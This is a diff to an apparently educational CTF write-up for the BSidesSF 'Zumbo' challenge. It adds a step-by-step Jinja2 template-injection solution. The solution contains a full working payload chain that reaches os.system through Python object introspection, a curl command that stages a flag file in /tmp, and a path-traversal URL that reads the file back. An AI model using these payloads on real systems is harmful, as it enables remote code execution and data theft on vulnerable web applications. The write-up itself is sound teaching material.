@@ -151,7 +151,7 @@ This technique of navigating around a filesystem in ways that the application de
 
 ## Solution 3
 
-> :book: I did not solve this challenge during the CTF. :( After the CTF, I read others' writeups but did not find them optimally educational. So I'm including a narrative writeup of a solution anyway, in accordance with the purpose of this repository. 
+> :book: I did not solve this challenge during the CTF. :( After the CTF, I read others' writeups but did not find them optimally educational. So I'm including a narrative writeup of a solution anyway, in accordance with the purpose of this repository.
 
 The final part of the Zumbo challenge teases us by saying this is "the final stage, with real hacking included!" For this final challenge, we need an intimate understanding of Python. But to begin to figure it out, we just continue on the same path as we were on from parts one and two. In this case, that means going back to the `server.py` script and reading it more closely.
 
@@ -304,7 +304,7 @@ This is the stage of the challenge requiring an intimate understanding of Python
 
 Discussed in the previously linked article is an apparently magic incantation, `{{ ''.__class__.__mro__[2].__subclasses__() }}`, that reveals access to the Python execution environment outside of the Jinja template sandbox. Rather than gloss over this detail, let's take the time to at least shallowly dissect why this works.
 
-We already understand the `{{` and `}}` are Jinja expressions, so let's begin by chunking the expression itself and injecting one piece at a time. The first part is the empty string `''`. This is simply a Python string literal. [Injecting it (with a payload of `%7B%7B''%7D%7D`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B''%7D%7D) returns the familiar "No such file or directory" error, but with zero content:
+We already understand the `{{` and `}}` are Jinja expressions, so let's begin by chunking the expression itself and injecting one piece at a time. The first part is the empty string `''`. This is simply a Python string literal. [Injecting it (with a payload of `%7B%7B''%7D%7D`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B''%7D%7D)) returns the familiar "No such file or directory" error, but with zero content:
 
 ```html
 [Errno 2] No such file or directory: u""
@@ -329,7 +329,7 @@ Python 2.7.13 (default, Dec 23 2016, 05:05:58)
 [GCC 4.2.1 Compatible Apple LLVM 7.0.2 (clang-700.1.81)] on darwin
 Type "help", "copyright", "credits" or "license" for more information.
 >>> ''.__class__
->>> <type 'str'>
+<type 'str'>
 ```
 
 As is expected, the `__class__` property of any object is a `type` object that reports the parent object's type. (We can prove this by inspecting the `type` object's own type: `''.__class__.__class__` will return `<type 'type'>`. This is equivalent to using [Python's built-in `type()` function](https://docs.python.org/2/library/functions.html#type). That is, `type('')` will also return `<type 'str'>` and, likewise, `type('').__class__` or `type(type(''))` will return `<type 'type'>`.) All this means is that `''.__class__` provides a way to access the Python object inheritance tree through the properties and methods of the built-in `type` objects. We could just as easily have accomplished the same thing by using an integer instead of a string: [injecting `1.__class__`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B1.__class__%7D%7D) will return `<type 'int'>`, which is also a `type` object:
@@ -352,7 +352,7 @@ Similarly, when we introspect on an integer by [injecting `{{1.__class__.__mro__
 
 > :bulb: The "MRO" in `__mro__` stands for Method Resolution Order. This was introduced in Python 2.3 to support Python's implementation of [multiple inheritance](https://en.wikipedia.org/wiki/Multiple_inheritance). The only reference to this in the official documentation is [a brief section discussing the difference between "new-style" versus "classic" classes](https://docs.python.org/2/reference/datamodel.html#new-style-and-classic-classes), but you can read [Python 2.3 Method Resolution Order](https://www.python.org/download/releases/2.3/mro/) to learn more.
 
-That root `object` object is what we're after. It's the third element in the `str` object's `__mro__` tuple, and the second in the `int` object's. That means either `''.__class__.__mro__[2]` or `1.__class__.__mro__[1]` will give us access it. [Injecting either the `int`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B1.__class__.__mro__[1]%7D%7D) or the [`str` introspection code](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B''.__class__.__mro__[2]%7D%7D) yields the same result:
+That root `object` object is what we're after. It's the third element in the `str` object's `__mro__` tuple, and the second in the `int` object's. That means either `''.__class__.__mro__[2]` or `1.__class__.__mro__[1]` will give us access to it. [Injecting either the `int`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B1.__class__.__mro__[1]%7D%7D) or the [`str` introspection code](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B''.__class__.__mro__[2]%7D%7D) yields the same result:
 
 ```html
 [Errno 2] No such file or directory: u'<type 'object'>' 
@@ -364,7 +364,7 @@ The root object is most certainly outside of the Jinja template engine, meaning 
 [Errno 2] No such file or directory: u"<built-in method __subclasses__ of type object at 0x905b80>" 
 ```
 
-Methods are an object's functions. When we call this method by [injecting `{{''.__class__.__mro__[2].__subclasses__()}}`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B''.__class__.__mro__[2].__subclasses__%28%29%7D%7D) (and in some cases, we need to use the percent-encoded equivalent of the open parentheses `(`, which is `%28`, and the close parenthesis `)`, which is `%29`, to do so), we are rewarded with [a long list available objects and classes](loot/http_zumbo-8ac445b1.ctf.bsidessf.net_%257B%257B''.__class__.__mro__[2].__subclasses__%2528%2529%257D%257D.html). Each item in this list represents some loaded Python code that we can execute by navigating through the maze of object references.
+Methods are an object's functions. When we call this method by [injecting `{{''.__class__.__mro__[2].__subclasses__()}}`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B''.__class__.__mro__[2].__subclasses__%28%29%7D%7D) (and in some cases, we need to use the percent-encoded equivalent of the open parentheses `(`, which is `%28`, and the close parenthesis `)`, which is `%29`, to do so), we are rewarded with [a long list of available objects and classes](loot/http_zumbo-8ac445b1.ctf.bsidessf.net_%257B%257B''.__class__.__mro__[2].__subclasses__%2528%2529%257D%257D.html). Each item in this list represents some loaded Python code that we can execute by navigating through the maze of object references.
 
 Since Python can execute arbitrary commands using [the `system()` method of its `os` module](https://docs.python.org/2/library/os.html#os.system), one way of achieving remote code execution is to try to find a way to reference the `os` module from the root object. There are other ways to achieve a similar effect, such as finding a loaded [`file` object](https://docs.python.org/2/library/stdtypes.html#bltin-file-objects) and using [its `write()` method](https://docs.python.org/2/library/stdtypes.html#file.write) to write Python source code to a file on the server, which we later try to execute. However, if we can get a reference to the `os` module, we can just execute commands as though we were sitting at the server's command line, ourselves.
 
@@ -386,9 +386,81 @@ Type "help", "copyright", "credits" or "license" for more information.
 ['WarningMessage', '_OptionError', '__all__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '_getaction', '_getcategory', '_processoptions', '_setoption', '_show_warning', 'catch_warnings', 'default_action', 'defaultaction', 'filters', 'filterwarnings', 'formatwarning', 'linecache', 'once_registry', 'onceregistry', 'resetwarnings', 'showwarning', 'simplefilter', 'sys', 'types', 'warn', 'warn_explicit', 'warnpy3k']
 ```
 
-After `import`ing the Python standard library's `warnings` module, we can see both `WarningMessage` and `catch_warnings`, which were among the accessible object references on the target server. (We can see [their source code](https://hg.python.org/cpython/file/2.7/Lib/warnings.py), since Python is free software.) Exploring these further reveals a pathway towarsd the `os` module:
+After `import`ing the Python standard library's `warnings` module in a local interpreter, we can see both `WarningMessage` and `catch_warnings` in the output of `dir()`. Both of these classes were among the accessible object references on the target server. To find a reference to the `os` module, though, we need one more piece of specialized Python language knowledge, the `__globals__` special attribute in [the Python data model](https://docs.python.org/2/reference/datamodel.html).
 
-:construction: TK-TODO
+In Python, each loaded function or class method has a (hidden) special attribute called `__globals__` (or `func_globals`, prior to Python version 2.6) described in the documentation as a "reference to the dictionary that holds the function’s global variables — the global namespace of the module in which the function was defined." Since both the `WarningMessage` and `catch_warnings` objects are classes, both of these will by definition have an `__init__()` method. That method, then, will have a `__globals__` (and synonymous `func_globals`) dictionary. We can prove this in our local interpreter, whose output I've truncated below:
+
+```sh
+>>> warnings.WarningMessage
+<class 'warnings.WarningMessage'>
+>>> warnings.WarningMessage.__init__
+<unbound method WarningMessage.__init__>
+>>> warnings.WarningMessage.__init__.__globals__
+{'filterwarnings': <function filterwarnings at 0x10bc95c80>, 'once_registry': {}, 'WarningMessage': <class 'warnings.WarningMessage'>, '_show_warning': <function _show_warning at 0x10bc95b90>, 'filters': [('ignore', None, <type 'exceptions.DeprecationWarning'>, None, 0), ('ignore', None, <type 'exceptions.PendingDeprecationWarning'>, None, 0), ('ignore', None, <type 'exceptions.ImportWarning'>, None, 0), ('ignore', None, <type 'exceptions.BytesWarning'>, None, 0)], '_setoption': <function _setoption at 0x10bc95f50>, 'showwarning': <function _show_warning at 0x10bc95b90>, '__all__': ['warn', 'warn_explicit', 'showwarning', 'formatwarning', 'filterwarnings', 'simplefilter', 'resetwarnings', 'catch_warnings'], 'onceregistry': {}, '__package__': None, 'simplefilter': <function simplefilter at 0x10bc95d70>, 'default_action': 'default', '_getcategory': <function _getcategory at 0x10bc9d0c8>, '__builtins__': {'bytearray': <type 'bytearray'>, 'IndexError': <type 'exceptions.IndexError'>, 'all': <built-in function all>, 'help': Type help() for interactive help, or help(object) for help about object., 'vars': <built-in function vars>, 'SyntaxError': <type 'exceptions.SyntaxError'>, 'unicode': <type 'unicode'>, 'UnicodeDecodeError': <type 'exceptions.UnicodeDecodeError'>, 'memoryview': <type 'memoryview'>, 'isinstance': <built-in function isinstance>, 'copyright': Copyright (c) 2001-2016 Python Software Foundation.
+```
+
+What's useful about the `__globals__` dictionary inside the `warnings` module's class objects is that, since the class objects were instantiated in the global Python namespace (which we can see by examining [their source code](https://hg.python.org/cpython/file/2.7/Lib/warnings.py), available to us thanks to the fact that Python is [free software](https://www.gnu.org/philosophy/free-sw.html)), this dictionary will contain references to other loaded Python standard library modules. One of those is [the `sys` module](https://docs.python.org/2/library/sys.html), and [the `sys` module has a dictionary called `modules`](https://docs.python.org/2/library/sys.html#sys.modules) that helpfully enumerates "modules that have already been loaded." Let's explore that:
+
+```sh
+>>> warnings.WarningMessage.__init__.__globals__['sys']
+<module 'sys' (built-in)>
+>>> warnings.WarningMessage.__init__.__globals__['sys'].modules.keys()
+['tokenize', 'heapq', 'copy_reg', 'sre_compile', '_collections', 'locale', '_sre', 'functools', 'encodings', 'site', '__builtin__', 'sysconfig', '__main__', 'operator', 'encodings.encodings', 'pkgutil', '_heapq', 'abc', 'posixpath', '_weakrefset', 'errno', 'encodings.codecs', 'sre_constants', 're', '_abcoll', 'collections', 'types', '_codecs', 'encodings.__builtin__', 'opcode', '_warnings', 'genericpath', 'stat', 'zipimport', '_sysconfigdata', 'string', 'warnings', 'UserDict', 'inspect', 'encodings.utf_8', 'repr', 'sys', '_osx_support', 'imp', 'codecs', 'readline', 'os.path', 'strop', '_functools', '_locale', 'thread', 'keyword', 'signal', 'traceback', 'pydoc', 'linecache', 'itertools', 'posix', 'encodings.aliases', 'exceptions', 'sre_parse', 'os', '_weakref', 'token', 'dis']
+```
+
+There it is, the `os` module, and its `system()` method:
+
+```sh
+>>> warnings.WarningMessage.__init__.__globals__['sys'].modules['os']
+<module 'os' from '/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.pyc'>
+>>> warnings.WarningMessage.__init__.__globals__['sys'].modules['os'].system
+<built-in function system>
+```
+
+Now that we can get a reference to the `system()` method by introspecting the `warnings.WarningMessage` class, the next step is to translate this into a URL payload. As usual, we start with the Jinja expression delimeters, then we walk up to the root object, as before. Recall that payload, URL-encoded is:
+
+```
+%7B%7B''.__class__.__mro__[2].__subclasses__%28%29%7D%7D
+```
+
+This produced the long list of available Python object and class references. We want to access the `warnings.WarningMessage` one, so we need to find its index number in the list. The naive way to do this is to simply enumerate each item in the list, starting at `0`, and incrementing until we find the value we're after. For instance, [injecting `{{''.__class__.__mro__[2].__subclasses__()[0]}}`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B''.__class__.__mro__[2].__subclasses__%28%29[0]%7D%7D) gives us the very first item in the list (`<type 'type'>`). Incrementing the `0` to a `1` and injecting that gives us the second item (`<type 'weakref'>`). We can continue in this manner until we get the desired result, which turns out to be index number `58`. Thus, [our payload so far is `{{''.__class__.__mro__[2].__subclasses__()[58]}}`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B''.__class__.__mro__[2].__subclasses__%28%29[58]%7D%7D):
+
+```html
+[Errno 2] No such file or directory: u"<class 'warnings.WarningMessage'>"
+```
+
+Now that we have found the `WarningMessage` class in the remote server, we traverse the object referneces in the same way we did on our local machine. This means we append `.__init__.__globals__['sys'].modules['os'].system` to our payload. This results in:
+
+```
+{{''.__class__.__mro__[2].__subclasses__()[58].__init__.__globals__['sys'].modules['os'].system}}
+```
+
+[URL-encode and inject it](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B58%5D.__init__.__globals__%5B%27sys%27%5D.modules%5B%27os%27%5D.system%7D%7D), and we are greeted with our desired function reference:
+
+```html
+[Errno 2] No such file or directory: u"<built-in function system>"
+```
+
+Finally, we can now run the `system()` method on the remote server with any command available to the Web server process. The command that should be is fairly clear by now. The `server.py` source code retrieves the third flag by making a HTTP `GET` request to `http://vault:8080/flag`. Let's just do the same thing. If we were at a command prompt on the remote server, all we would need to do is run `curl http://vault:8080/flag`. That would download the `/flag` file from the `vault` server listening on port `8080` and spit out the contents of the file to our terminal. But we're *not* at a terminal on the server, we're in a *Python* method.
+
+Since the `system()` method cannot be used to retrieve the output of the command we run (merely its exit status), we will need to redirect the output of a command to a file that we can write to. By convention on most *nix-style servers, the `/tmp` directory is "world-writeable," meaning any process can write files there, so we can use that directory as a kind of scratchpad. When we pass a command to the `system()` method, Python executes it "in a subshell," so we need to use the standard [shell IO redirection](http://www.tldp.org/LDP/abs/html/io-redirection.html) syntax to do so. We'll pick a name for our temporary file that is memorable but inconspicuous and redirect the output of the `curl` command to it. Our ultimate command would thus look something like `curl http://vault:8080/flag > /tmp/totally.inconspicuous.file`.
+
+At long last, our full injection payload becomes possible:
+
+```
+{{''.__class__.__mro__[2].__subclasses__()[58].__init__.__globals__['sys'].modules['os'].system('curl http://vault:8080/flag > /tmp/totally.inconspicuous.file')}}
+```
+
+Once again we [URL-encode and inject it](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B58%5D.__init__.__globals__%5B%27sys%27%5D.modules%5B%27os%27%5D.system%28%27curl+http%3A%2F%2Fvault%3A8080%2Fflag+%3E+%2Ftmp%2Ftotally.inconspicuous.file%27%29%7D%7D) by loading the payload URL with a Web browser, and we receive the `0` exit status from the `system()` method's successful execution of the `curl` command:
+
+```html
+[Errno 2] No such file or directory: u"0"
+<!-- page: 0, src: /code/server.py -->
+```
+
+The flag file contents has now, presumably, been downloaded to the server's local filesystem and resides at `/tmp/totally.inconspicuous.file`. To get it, all we need to do is use the path traversal attack we discovered in the previous part of this challenge. This time, though, instead of `/flag` the flag will be at `/tmp/totally.inconspicuous.file`. Our last URL payload is thus `/%2e%2e%2f%2e%2e%2ftmp/totally.inconspicuous.file`. [Loading that URL](http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2ftmp/totally.inconspicuous.file) now reveals the flag:
+
+![Screenshot of the Zumbo 3 flag loaded using path traversal attack.](screenshots/flag3.png)
 
 # Tools
 
